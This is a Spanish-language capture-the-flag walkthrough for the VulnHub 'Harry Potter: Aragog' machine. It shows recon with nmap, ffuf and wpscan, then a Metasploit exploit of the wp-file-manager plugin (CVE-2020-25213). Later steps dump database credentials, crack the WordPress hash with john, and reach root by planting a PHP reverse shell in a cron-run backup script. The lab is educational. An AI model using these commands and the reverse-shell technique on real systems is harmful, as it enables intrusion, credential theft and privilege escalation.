<h1 align="center">
<br>
  <img src="https://www.hp-lexicon.org/wp-content/uploads/2016/06/goodbye-friends-of-hagrid.jpg" alt="Front-End Checklist" width="300">
  <br>
  Harry Potter: Aragog
  <br>
</h1>

<h4 align="center">Maquina creada por <img src="https://img.icons8.com/android/344/twitter.png" alt="Front-End Checklist" width="12">@time4ster</h4>
<h4 align="center">Aquí puedes descargarte la <a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">página web</a> y ver una descripción de ella</h4>

---

# Índice

- [Recopilación de información](#recopilación-de-información)
  - [Nmap](#nmap)
  - [Fuzz]()
- [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades)
  - [Wordpress]()
- [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades)
  - [Metasploit]()
- [Post-explotación](#post-explotación)
  - [Movimiento Lateral]()
    - [Mysql]()
  - [Búsqueda de vulnerabilidades](#búsqueda-de-vulnerabilidades-1)
  - [Explotación de vulnerabilidades](#explotación-de-vulnerabilidades-1)
       - [Reverse Shell]()
- [Información Adicional](#información-adicional)


---

## Recopilación de información

Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas web, etc.

### Nmap

Veremos que redes estan conectadas a esta subred con este comando:

```nmap -sP 192.168.221.0/24```

Para ver los puertos abiertos que tiene la red utilizaremos este comando:

```nmap -sV -sC 192.168.221.7```

### Fuzz

Fuzzearemos la web para ver quw tiene:

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.7/FUZZ```

Despues fuzzearemos el **/blog/**:

```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.7/blog/FUZZ```

## Búsqueda de vulnerabilidades

### Wordpress

Al ver que es un **wordpress** usaremos el **wpscan**:

```wpscan --url http://192.168.221.7/blog/ --plugins-detection aggressive```

Esto es lo que recibimos con el wpscan:
```
        wp-file-manager
         | Location: http://192.168.221.7/blog/wp-content/plugins/wp-file-manager/
         | Last Updated: 2021-03-30T06:37:00.000Z
         | Readme: http://192.168.221.7/blog/wp-content/plugins/wp-file-manager/readme.txt
         | [!] The version is out of date, the latest version is 7.1.1
```

## Explotación de vulnerabilidades

A la hora de explotar esta vulnerabilidad he encontrado este [exploit](https://www.exploit-db.com/exploits/49178) que utilizaremos para ver que CVE podemos buscar en el metasploit.

### Metasploit

Ahora en metasploit configuraremos esto para explotar esa vulnerabilidad:
```
        search CVE-2020-25213
        use 0
        set rhosts 192.168.221.7
        set lhost 192.168.221.4
        set targeturi /blog
        exploit
```

Con esto hemos conseguido ser el usuario **www-data**

## Post-explotación

## Movimiento Lateral

Desde donde estamos podemos conseguir la primera flag del usuario **hagrid98**

Aquí la primera flag: **horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}**

Ahora buscando encontraremos esta ruta que tiene buena pinta: ```/etc/wordpress```

El contendio del archivo **config-default.php** es este:

 ```
        <?php
        define('DB_NAME', 'wordpress');
        define('DB_USER', 'root');
        define('DB_PASSWORD', 'mySecr3tPass');
        define('DB_HOST', 'localhost');
        define('DB_COLLATE', 'utf8_general_ci');
        define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
        ?>
 ```
 
 Como podemos ver hay unas credenciales de una base de datos.

### Mysql

Como estamos en un sessión en meterpreter utilizaremos estos siguientes comandos para leer los datos de la base de datos:

```
        shell
        mysql -u root -p
        mySecr3tPass
        use wordpress;
        select*from wp_users;
 ```
 
 El resultado de la tabla **wp_users** es este:
 
 ```
                1       hagrid98        $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.      wp-admin        hagrid98@localhost.local                2021-03-31 14:21:02             0       WP-Admin
```

Con el hash que hemos conseguido lo creckearemos con el john:

```john --wordlist=/opt/wordlists/rockyou.txt hash```

El resultado:

```
password123      (?)
```

Ahora nos conectaremos por ssh al usuario y ya seremos **hagrid98**

## Búsqueda de vulnerabilidades

Ahora comenzaremos a enumerar todo lo possible hasta encontrar en la carpeta **/opt** con el comando ```ls -a``` un archivo llamado **.backup.sh** que contiene esto:

```
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
```

## Explotación de vulnerabilidades

Para explotar esta vulnerabilidad nos crearemos una reverse shell y haremos que el script ejecute esa shell.

### Reverse Shell

Crearemos una [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) y la modificaremos la dirección ip y el puerto, añadiendo poniendo el puerto en escucha en otra terminal con este comando: ```rlwrap nc -nvlp 1234```

Añadiremos al script esta línea para que ejecute la reverse shell:
```php /tmp/php-reverse-shell.php```

Gracias a esto somos **root** y podemos leer la segunda flag:

```
  ____                            _         _       _   _
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




 #For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
```

## Información Adicional

Páginas web utilizadas:

- [WordPress CVE-2020-25213](https://www.exploit-db.com/exploits/49178) - Exploit para saber que CVE podemos buscar

- [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) - Reverse Shell PHP


**[⬆ back to top](#-----harry-potter-aragog-)**
